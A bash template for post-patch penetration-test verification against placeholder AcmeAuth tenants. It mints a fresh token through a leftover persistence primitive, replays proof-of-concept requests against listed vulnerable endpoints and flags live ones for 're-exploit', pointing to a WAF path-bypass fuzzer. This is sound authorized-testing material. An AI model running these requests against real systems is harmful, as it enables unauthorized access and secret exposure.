#!/usr/bin/env bash
# patch-verify.sh — Post-patch re-verification protocol. When a vendor reports
# a patch, never assume closure. This script:
#   1. (Optional) Mints a fresh credential via a still-live persistence primitive
#      to prove the auth surface itself wasn't touched.
#   2. Re-runs each PoC from a list, recording before/after status codes.
#   3. Runs the path-bypass fuzzer against each patched endpoint.
#   4. Sweeps all supplied tenants.
#
# See references/methodology-lessons.md Lesson 3.
#
# Usage: this is a template — copy and edit per engagement. The structure is
# the load-bearing part; the specifics depend on what you're verifying.
#
# Authorized testing only.

set -uo pipefail

# ============================================================================
# CONFIG — edit per engagement
# ============================================================================

# Tenants to sweep (AcmeAuth example)
TENANTS=(
  "tenant-001.cdn.acmeauth.example"
  "tenant-002.cdn.acmeauth.example"
  "pentesting2.cdn.acmeauth.example"
  "portal.acmeauth.example"
  "demobank.acmeauth.example"
  "tenant-demo.cdn.acmeauth.example"
  "sampleapp.dev.acmeauth.example"  # v11.5.0 — version differential
)

# Persistence primitive still live (AcmeAuth F8 example).
# Used to mint a fresh token and prove the issuance surface wasn't touched.
# Leave empty to skip.
INSTALL_TOKEN=""  # e.g. "hypws-token"
INSTALL_URL_FMT="https://%s/rp/token/endpoint/exchange/installtoken"
INSTALL_BODY='{"wsinstallToken":{"token":"'"$INSTALL_TOKEN"'","machineId":"retest","rpAppId":"AcmeAuthDefaultWorkstationApplication"}}'

# Patched endpoints to re-verify. Each line: METHOD|PATH|description
# Use ZZFAKE for any path-param placeholder (never real identifiers).
ENDPOINTS=(
  "GET|/cc/api/acmeauth/idp/integrations/configured|F5 keycloakSecret leak"
  "GET|/cc/api/idp/integration/enablement?rpAppId=ZZFAKE|F7 enablement read"
  "POST|/cc/api/idp/suspend/ZZFAKE|F7 suspend SSO"
  "GET|/cc/api/support/allowed?email=nobody@nowhere.com|F7 support check"
)

# Expected post-patch response (used as the "patched" signature)
PATCHED_SIGNATURE="Ensure the URL is valid"

# ============================================================================
# RUN
# ============================================================================

OUTDIR="$(mktemp -d)"
trap 'rm -rf "$OUTDIR"' EXIT
SUMMARY="${OUTDIR}/summary.tsv"
echo -e "TENANT\tMETHOD\tPATH\tSTATUS\tVERDICT" > "$SUMMARY"

echo "=== Post-Patch Verification ==="
echo "Tenants: ${#TENANTS[@]}"
echo "Endpoints: ${#ENDPOINTS[@]}"
echo ""

# Step 1: Mint fresh token if persistence primitive is configured
FRESH_TOKEN=""
if [[ -n "$INSTALL_TOKEN" ]]; then
  echo "--- Step 1: Mint fresh token via persistence primitive ---"
  PRIMARY_TENANT="${TENANTS[0]}"
  url=$(printf "$INSTALL_URL_FMT" "$PRIMARY_TENANT")
  resp=$(curl -s -X POST -H "Content-Type: application/json" -d "$INSTALL_BODY" "$url")
  echo "Mint response from $PRIMARY_TENANT:"
  echo "$resp" | head -c 500
  echo ""
  FRESH_TOKEN=$(echo "$resp" | python3 -c "import sys,json; print(json.load(sys.stdin).get('token',''))" 2>/dev/null || echo "")
  if [[ -n "$FRESH_TOKEN" ]]; then
    echo "✅ Fresh token minted: ${FRESH_TOKEN:0:25}... (proves issuance surface untouched)"
  else
    echo "⚠️  Token mint failed — install token may be revoked. Use existing token below."
  fi
  echo ""
fi

TOKEN_TO_USE="${FRESH_TOKEN:-${TOKEN:-}}"
if [[ -z "$TOKEN_TO_USE" ]]; then
  echo "Error: no token available. Set FRESH_TOKEN path or pass TOKEN env var."
  exit 1
fi

# Step 2 + 3: Re-run PoCs across all tenants
echo "--- Step 2+3: Re-run PoCs across tenants ---"
for tenant in "${TENANTS[@]}"; do
  echo ""
  echo "▶ Tenant: $tenant"
  for ep in "${ENDPOINTS[@]}"; do
    IFS='|' read -r method path desc <<< "$ep"
    url="https://${tenant}${path}"

    body_file="${OUTDIR}/${tenant}_${method}_$(echo "$path" | tr '/?=' '___').body"
    stat=$(curl -s -o "$body_file" -D - -w "%{http_code}" \
      -X "$method" \
      -H "Authorization: Bearer $TOKEN_TO_USE" \
      "$url")
    code=$(echo "$stat" | tail -1)
    body_preview=$(head -c 200 "$body_file" | tr -d '\n\r')

    # Verdict
    verdict="?"
    if [[ "$code" == "403" ]] && grep -q "$PATCHED_SIGNATURE" "$body_file" 2>/dev/null; then
      verdict="✅ PATCHED (path filter)"
    elif [[ "$code" == "403" ]]; then
      verdict="✅ PATCHED (annotation)"
    elif [[ "$code" == "200" ]]; then
      if [[ "$body_preview" == \<\!DOCTYPE* ]] || [[ "$body_preview" == \<html* ]]; then
        verdict="⚠️  200 HTML — SPA FALLBACK (case-variant trap)"
      else
        verdict="🔴 LIVE — re-exploit"
      fi
    elif [[ "$code" == "401" ]]; then
      verdict="401 (token scope/validity issue)"
    elif [[ "$code" == "404" ]]; then
      verdict="404 (endpoint removed — version diff?)"
    else
      verdict="$code (investigate)"
    fi

    printf "  %-6s %-55s %s\n" "$method" "$desc" "$verdict"
    echo -e "${tenant}\t${method}\t${path}\t${code}\t${verdict}" >> "$SUMMARY"
  done
done

echo ""
echo "=== Summary table ==="
column -t -s $'\t' "$SUMMARY"

echo ""
echo "=== Step 4 (manual): Path-bypass fuzzer per patched endpoint ==="
echo "For each 'PATCHED' endpoint above, run scripts/path-bypass-fuzzer.sh to confirm"
echo "no normalization/encoding variant bypasses the filter:"
echo ""
echo "  ./scripts/path-bypass-fuzzer.sh https://<tenant> <path> <method> 'Authorization: Bearer $TOKEN_TO_USE'"
echo ""
echo "=== Step 5 (manual): Distinguish patch mechanism ==="
echo "If all patched endpoints return {\"detail\":\"$PATCHED_SIGNATURE\"}:"
echo "  → Path-filter at WAF/gateway layer (not @PreAuthorize annotations)."
echo "  → Adjacent endpoints in the same namespace may still be exposed — sweep them."
echo ""
echo "Output saved to: $OUTDIR/"
